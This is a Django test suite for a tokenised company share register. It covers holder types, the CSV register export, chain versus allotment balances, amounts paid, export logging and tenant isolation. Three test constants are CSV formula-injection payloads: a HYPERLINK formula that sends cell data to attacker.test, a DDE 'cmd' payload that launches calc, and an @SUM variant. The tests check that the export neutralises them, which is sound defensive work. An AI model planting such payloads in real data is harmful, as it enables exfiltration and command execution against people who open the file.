import csv
import io
from datetime import timedelta
from decimal import Decimal
from unittest.mock import patch

from django.contrib.auth import get_user_model
from django.utils import timezone
from rest_framework.test import APITestCase
from web3 import Web3

from companies.models import Company, CompanyStatus
from offerings.models import (
    Offering,
    OfferingExemption,
    Subscription,
    SubscriptionStatus,
)
from offerings.services.subscription import scale_back
from tokens.models import (
    IssuanceStatus,
    RequestStatus,
    ShareIssuance,
    ShareIssuanceRequest,
    ShareToken,
    ShareTokenStatus,
)
from tokens.services.register import (
    REGISTER_HEADERS,
    SOURCE_ALLOTMENTS,
    SOURCE_CHAIN,
    SOURCE_LABELS,
)
from users.models import UserAccount, UserProfile
from wallets.models import Wallet
from whitelist.models import WhitelistEntry, WhitelistStatus

User = get_user_model()

MEMBER = Web3.to_checksum_address("0x" + "a1" * 20)
TREASURY = Web3.to_checksum_address("0x" + "b2" * 20)
SHARED = Web3.to_checksum_address("0x" + "c3" * 20)
STRANGER = Web3.to_checksum_address("0x" + "d4" * 20)
RESIDENCE = "12 Register Street, Sydney NSW 2000"
FORMULA_NAME = '=HYPERLINK("http://attacker.test/"&A2&B2,"Open")'
FORMULA_ADDRESS = "-2+3+cmd|' /C calc'!A0"
FORMULA_LABEL = "@SUM(1+1)*cmd"


def _raise():
    raise RuntimeError("rpc timeout")


def _account(email, name, residence=""):
    user = User.objects.create_user(email=email, password="pw-12345678")
    profile = UserProfile.objects.create(user=user, full_name=name, residential_address=residence)
    account = UserAccount.objects.create(account_number=email[:20])
    account.user_profiles.add(profile)
    return account


class RegisterTestBase(APITestCase):
    def setUp(self):
        self.owner = User.objects.create_user(email="issuer@example.test", password="pw-12345678")
        self.company = Company.objects.create(
            owner=self.owner, name="Register Pty Ltd", acn="123123123", status=CompanyStatus.ACTIVE
        )
        self.token = ShareToken.objects.create(
            company=self.company,
            name="Register ordinary shares",
            symbol="REG",
            total_supply="10000",
            status=ShareTokenStatus.DEPLOYED,
            contract_address=Web3.to_checksum_address("0x" + "e5" * 20),
        )
        self.client.force_authenticate(self.owner)

    def _allot(self, address, amount, name="", completed_at=None):
        return ShareIssuance.objects.create(
            token=self.token,
            recipient_address=address,
            recipient_name=name,
            amount=str(amount),
            status=IssuanceStatus.COMPLETED,
            completed_at=completed_at or timezone.now(),
        )

    def _paid_allotment(self, account, wallet, address, amount, received):
        offering = Offering.objects.create(
            token=self.token,
            exemption=OfferingExemption.PROFESSIONAL,
            price_per_share=Decimal("2.50"),
            minimum_shares=1,
            target_shares=10,
            cap_shares=1000,
            opens_at=timezone.now() - timedelta(days=1),
        )
        request = ShareIssuanceRequest.objects.create(
            token=self.token,
            recipient_address=address,
            amount=amount,
            reason="Allotment",
            status=RequestStatus.EXECUTED,
        )
        issuance = self._allot(address, amount)
        request.executed_issuance = issuance
        request.save(update_fields=["executed_issuance"])
        Subscription.objects.create(
            offering=offering,
            user_account=account,
            wallet=wallet,
            quantity=amount,
            price_per_share=Decimal("2.50"),
            amount_due=Decimal(amount) * Decimal("2.50"),
            amount_received=received,
            status=SubscriptionStatus.ALLOTTED,
            issuance_request=request,
        )
        return issuance

    def _offering(self, cap_shares=1000):
        return Offering.objects.create(
            token=self.token,
            exemption=OfferingExemption.PROFESSIONAL,
            price_per_share=Decimal("2.50"),
            minimum_shares=1,
            target_shares=10,
            cap_shares=cap_shares,
            opens_at=timezone.now() - timedelta(days=1),
        )

    def _subscription(self, offering, account, wallet, quantity, received):
        return Subscription.objects.create(
            offering=offering,
            user_account=account,
            wallet=wallet,
            quantity=quantity,
            price_per_share=Decimal("2.50"),
            amount_due=Decimal(quantity) * Decimal("2.50"),
            amount_received=received,
            status=SubscriptionStatus.PAID,
        )

    def _issue_against(self, subscription, mark_allotted=True):
        allotted = subscription.allotment_quantity
        request = ShareIssuanceRequest.objects.create(
            token=self.token,
            recipient_address=subscription.wallet.address,
            amount=allotted,
            reason="Allotment",
            status=RequestStatus.EXECUTED,
        )
        issuance = self._allot(subscription.wallet.address, allotted)
        request.executed_issuance = issuance
        request.save(update_fields=["executed_issuance"])
        subscription.issuance_request = request
        subscription.save(update_fields=["issuance_request"])
        if mark_allotted:
            subscription.mark_allotted()
        return issuance

    def _wallet(self, account, address):
        return Wallet.objects.create(user_account=account, address=address, chain="base")

    def _balances(self, mapping):
        return self._reader(lambda contract, address: mapping[address])

    def _reader(self, side_effect):
        service = patch("tokens.services.register.ShareTokenService").start()
        self.addCleanup(patch.stopall)
        service.return_value.get_token_balance.side_effect = side_effect
        return service


class HolderTypeTest(RegisterTestBase):
    def test_the_four_holder_types_come_out_of_one_register_read(self):
        member_account = _account("member@example.test", "Mary Member", RESIDENCE)
        member_wallet = self._wallet(member_account, MEMBER)
        WhitelistEntry.objects.create(wallet=member_wallet, status=WhitelistStatus.ACTIVE, is_whitelisted=True)
        WhitelistEntry.objects.create(address=TREASURY, label="Company treasury", status=WhitelistStatus.ACTIVE)
        first = self._wallet(_account("one@example.test", "Ann One"), SHARED)
        second = self._wallet(_account("two@example.test", "Bob Two"), SHARED)
        WhitelistEntry.objects.create(wallet=first, status=WhitelistStatus.ACTIVE)
        WhitelistEntry.objects.create(wallet=second, status=WhitelistStatus.ACTIVE)
        self._allot(MEMBER, 100)
        self._allot(TREASURY, 50)
        self._allot(SHARED, 25)
        self._allot(STRANGER, 10, name="Stranger from a spreadsheet")
        self._balances({MEMBER: 100, TREASURY: 50, SHARED: 25, STRANGER: 10})

        response = self.client.get(f"/api/v1/tokens/{self.token.uuid}/holders/")

        self.assertEqual(response.status_code, 200)
        rows = {row["address"]: row for row in response.json()["holders"]}
        self.assertEqual(rows[MEMBER]["holderType"], "member")
        self.assertEqual(rows[MEMBER]["name"], "Mary Member")
        self.assertEqual(rows[TREASURY]["holderType"], "treasury")
        self.assertEqual(rows[TREASURY]["name"], "Company treasury")
        self.assertEqual(rows[SHARED]["holderType"], "ambiguous")
        self.assertEqual(rows[STRANGER]["holderType"], "unidentified")
        self.assertEqual(rows[STRANGER]["name"], "Stranger from a spreadsheet")
        self.assertEqual(response.json()["totalHolders"], 4)

    def test_the_chain_wins_over_the_allotment_record_and_a_former_member_drops_off(self):
        self._allot(MEMBER, 100)
        self._allot(STRANGER, 50)
        self._balances({MEMBER: 42, STRANGER: 0})

        response = self.client.get(f"/api/v1/tokens/{self.token.uuid}/holders/")

        holders = response.json()["holders"]
        self.assertEqual([(row["address"], row["balance"]) for row in holders], [(MEMBER, "42")])
        self.assertEqual(holders[0]["percentage"], 100.0)
        self.assertEqual(holders[0]["source"], "blockchain")

    def test_the_four_keys_the_dashboard_already_reads_survive_and_three_are_added(self):
        self._allot(MEMBER, 8)
        self._balances({MEMBER: 8})

        holders = self.client.get(f"/api/v1/tokens/{self.token.uuid}/holders/").json()["holders"]

        self.assertEqual(
            set(holders[0]),
            {"address", "name", "balance", "percentage", "source", "holderType", "enteredOn", "shareClass"},
        )
        self.assertEqual(holders[0]["shareClass"], "REG")
        self.assertIsNotNone(holders[0]["enteredOn"])


class RegisterExportTest(RegisterTestBase):
    def test_the_csv_carries_the_header_the_residential_address_and_a_blank_unknown_amount(self):
        member_account = _account("member@example.test", "Mary Member", RESIDENCE)
        member_wallet = self._wallet(member_account, MEMBER)
        WhitelistEntry.objects.create(wallet=member_wallet, status=WhitelistStatus.ACTIVE, is_whitelisted=True)
        self._paid_allotment(member_account, member_wallet, MEMBER, 100, Decimal("250.00"))
        WhitelistEntry.objects.create(address=TREASURY, label="Company treasury", status=WhitelistStatus.ACTIVE)
        self._allot(TREASURY, 50)
        self._balances({MEMBER: 100, TREASURY: 50})

        response = self.client.get(f"/api/v1/tokens/{self.token.uuid}/register/export/")

        self.assertEqual(response.status_code, 200)
        self.assertEqual(response["Content-Type"], "text/csv")
        rows = list(csv.reader(io.StringIO(response.content.decode())))
        self.assertEqual(rows[0], REGISTER_HEADERS)
        body = {row[0]: row for row in rows[1:]}
        self.assertEqual(body["Mary Member"][1], RESIDENCE)
        self.assertEqual(body["Mary Member"][3:7], ["Member", "REG", "100", SOURCE_LABELS[SOURCE_CHAIN]])
        self.assertEqual(body["Mary Member"][8:], ["Active", "250.00"])
        self.assertEqual(body["Company treasury"][1], "")
        self.assertEqual(body["Company treasury"][9], "")

    def test_the_residential_address_never_reaches_the_api(self):
        member_account = _account("member@example.test", "Mary Member", RESIDENCE)
        member_wallet = self._wallet(member_account, MEMBER)
        WhitelistEntry.objects.create(wallet=member_wallet, status=WhitelistStatus.ACTIVE)
        self._allot(MEMBER, 100)
        self._balances({MEMBER: 100})

        api = self.client.get(f"/api/v1/tokens/{self.token.uuid}/holders/")
        export = self.client.get(f"/api/v1/tokens/{self.token.uuid}/register/export/")

        self.assertNotIn(RESIDENCE, api.content.decode())
        self.assertIn(RESIDENCE, export.content.decode())

    @patch("tokens.services.register.logger")
    def test_every_export_writes_one_log_line_with_who_ran_it_and_how_many_rows(self, log):
        self._allot(MEMBER, 100)
        self._balances({MEMBER: 100})

        self.client.get(f"/api/v1/tokens/{self.token.uuid}/register/export/")

        message = log.info.call_args[0][0]
        self.assertIn("1 rows", message)
        self.assertIn(f"requested by user {self.owner.pk}", message)


class RegisterTruthTest(RegisterTestBase):
    def test_one_unreadable_balance_never_drops_a_member_from_the_register(self):
        account = _account("pat@example.test", "Pat Partial", RESIDENCE)
        wallet = self._wallet(account, MEMBER)
        WhitelistEntry.objects.create(wallet=wallet, status=WhitelistStatus.ACTIVE, is_whitelisted=True)
        self._allot(MEMBER, 100)
        self._allot(TREASURY, 40)
        self._reader(lambda contract, address: 40 if address == TREASURY else _raise())

        holders = self.client.get(f"/api/v1/tokens/{self.token.uuid}/holders/").json()

        self.assertEqual(holders["totalHolders"], 2)
        self.assertEqual({row["address"] for row in holders["holders"]}, {MEMBER, TREASURY})
        self.assertEqual({row["source"] for row in holders["holders"]}, {SOURCE_ALLOTMENTS})
        self.assertEqual({row["percentage"] for row in holders["holders"]}, {71.43, 28.57})

    def test_a_holding_only_part_of_which_was_subscribed_prints_no_amount_paid(self):
        account = _account("mia@example.test", "Mia Mixed", RESIDENCE)
        wallet = self._wallet(account, MEMBER)
        WhitelistEntry.objects.create(wallet=wallet, status=WhitelistStatus.ACTIVE, is_whitelisted=True)
        self._allot(MEMBER, 1000)
        self._paid_allotment(account, wallet, MEMBER, 10, Decimal("20.00"))
        self._balances({MEMBER: 1010})

        response = self.client.get(f"/api/v1/tokens/{self.token.uuid}/register/export/")

        row = list(csv.reader(io.StringIO(response.content.decode())))[1]
        self.assertEqual(row[0], "Mia Mixed")
        self.assertEqual(row[5], "1010")
        self.assertEqual(row[9], "")

    def test_a_chain_balance_below_the_allotment_prints_no_amount_paid(self):
        account = _account("cut@example.test", "Cut Down", RESIDENCE)
        wallet = self._wallet(account, MEMBER)
        WhitelistEntry.objects.create(wallet=wallet, status=WhitelistStatus.ACTIVE, is_whitelisted=True)
        self._paid_allotment(account, wallet, MEMBER, 100, Decimal("250.00"))
        self._balances({MEMBER: 42})

        response = self.client.get(f"/api/v1/tokens/{self.token.uuid}/register/export/")

        row = list(csv.reader(io.StringIO(response.content.decode())))[1]
        self.assertEqual(row[5], "42")
        self.assertEqual(row[6], SOURCE_LABELS[SOURCE_CHAIN])
        self.assertEqual(row[9], "")

    def test_a_scaled_back_subscription_prints_the_money_backing_the_shares_not_the_money_received(self):
        account = _account("sca@example.test", "Sam Scaled", RESIDENCE)
        wallet = self._wallet(account, MEMBER)
        WhitelistEntry.objects.create(wallet=wallet, status=WhitelistStatus.ACTIVE, is_whitelisted=True)
        offering = self._offering(cap_shares=40)
        subscription = self._subscription(offering, account, wallet, 100, Decimal("250.00"))
        scale_back(offering)
        subscription.refresh_from_db()
        self.assertEqual(subscription.allotted_quantity, 40)
        self.assertEqual(subscription.refund_amount, Decimal("150.00"))
        self.assertIsNone(subscription.refunded_at)
        self.assertEqual(subscription.money_held, Decimal("250.00"))
        self._issue_against(subscription)
        self._balances({MEMBER: 40})

        response = self.client.get(f"/api/v1/tokens/{self.token.uuid}/register/export/")

        row = list(csv.reader(io.StringIO(response.content.decode())))[1]
        self.assertEqual(row[5], "40")
        self.assertEqual(row[9], "100.00")

    def test_an_allotment_the_money_record_has_not_caught_up_with_prints_no_amount_paid(self):
        account = _account("lag@example.test", "Lagging Mirror", RESIDENCE)
        wallet = self._wallet(account, MEMBER)
        WhitelistEntry.objects.create(wallet=wallet, status=WhitelistStatus.ACTIVE, is_whitelisted=True)
        subscription = self._subscription(self._offering(), account, wallet, 40, Decimal("100.00"))
        self._issue_against(subscription, mark_allotted=False)
        self.assertEqual(subscription.status, SubscriptionStatus.PAID)
        self._balances({MEMBER: 40})

        response = self.client.get(f"/api/v1/tokens/{self.token.uuid}/register/export/")

        row = list(csv.reader(io.StringIO(response.content.decode())))[1]
        self.assertEqual(row[5], "40")
        self.assertEqual(row[9], "")

    def test_a_holding_every_share_of_which_was_subscribed_prints_the_total_paid(self):
        account = _account("sue@example.test", "Sue Subscribed", RESIDENCE)
        wallet = self._wallet(account, MEMBER)
        WhitelistEntry.objects.create(wallet=wallet, status=WhitelistStatus.ACTIVE, is_whitelisted=True)
        self._paid_allotment(account, wallet, MEMBER, 40, Decimal("100.00"))
        self._paid_allotment(account, wallet, MEMBER, 10, Decimal("25.00"))
        self._balances({MEMBER: 50})

        response = self.client.get(f"/api/v1/tokens/{self.token.uuid}/register/export/")

        row = list(csv.reader(io.StringIO(response.content.decode())))[1]
        self.assertEqual(row[5], "50")
        self.assertEqual(row[9], "125.00")

    def test_a_register_that_is_not_chain_confirmed_says_so_on_every_csv_row(self):
        self._allot(MEMBER, 100)
        self._allot(TREASURY, 40)
        self._reader(lambda contract, address: 40 if address == TREASURY else _raise())

        response = self.client.get(f"/api/v1/tokens/{self.token.uuid}/register/export/")

        rows = list(csv.reader(io.StringIO(response.content.decode())))
        self.assertEqual(rows[0][6], "Balance source")
        self.assertEqual([row[6] for row in rows[1:]], [SOURCE_LABELS[SOURCE_ALLOTMENTS]] * 2)

    @patch("tokens.services.register.logger")
    def test_an_export_that_is_not_chain_confirmed_is_logged_as_a_warning(self, log):
        self._allot(MEMBER, 100)
        self._reader(lambda contract, address: _raise())

        self.client.get(f"/api/v1/tokens/{self.token.uuid}/register/export/")

        self.assertIn("is not confirmed on chain", log.warning.call_args[0][0])

    def test_a_name_or_address_that_opens_like_a_formula_is_neutralised_in_the_csv(self):
        account = _account("evil@example.test", FORMULA_NAME, FORMULA_ADDRESS)
        wallet = self._wallet(account, MEMBER)
        WhitelistEntry.objects.create(wallet=wallet, status=WhitelistStatus.ACTIVE, is_whitelisted=True)
        self._allot(MEMBER, 100)
        self._balances({MEMBER: 100})

        response = self.client.get(f"/api/v1/tokens/{self.token.uuid}/register/export/")

        row = list(csv.reader(io.StringIO(response.content.decode())))[1]
        self.assertEqual(row[0], f"'{FORMULA_NAME}")
        self.assertEqual(row[1], f"'{FORMULA_ADDRESS}")

    def test_a_treasury_label_that_opens_like_a_formula_is_neutralised_in_the_csv(self):
        WhitelistEntry.objects.create(address=TREASURY, label=FORMULA_LABEL, status=WhitelistStatus.ACTIVE)
        self._allot(TREASURY, 50)
        self._balances({TREASURY: 50})

        response = self.client.get(f"/api/v1/tokens/{self.token.uuid}/register/export/")

        row = list(csv.reader(io.StringIO(response.content.decode())))[1]
        self.assertEqual(row[0], f"'{FORMULA_LABEL}")


class RegisterIsolationTest(RegisterTestBase):
    def test_another_tenant_gets_a_phantom_404_on_the_register_and_its_export(self):
        stranger = User.objects.create_user(email="stranger@example.test", password="pw-12345678")
        self._allot(MEMBER, 100)
        self._balances({MEMBER: 100})
        self.client.force_authenticate(stranger)

        for path in ("holders", "register/export"):
            with self.subTest(path=path):
                response = self.client.get(f"/api/v1/tokens/{self.token.uuid}/{path}/")
                self.assertEqual(response.status_code, 404)
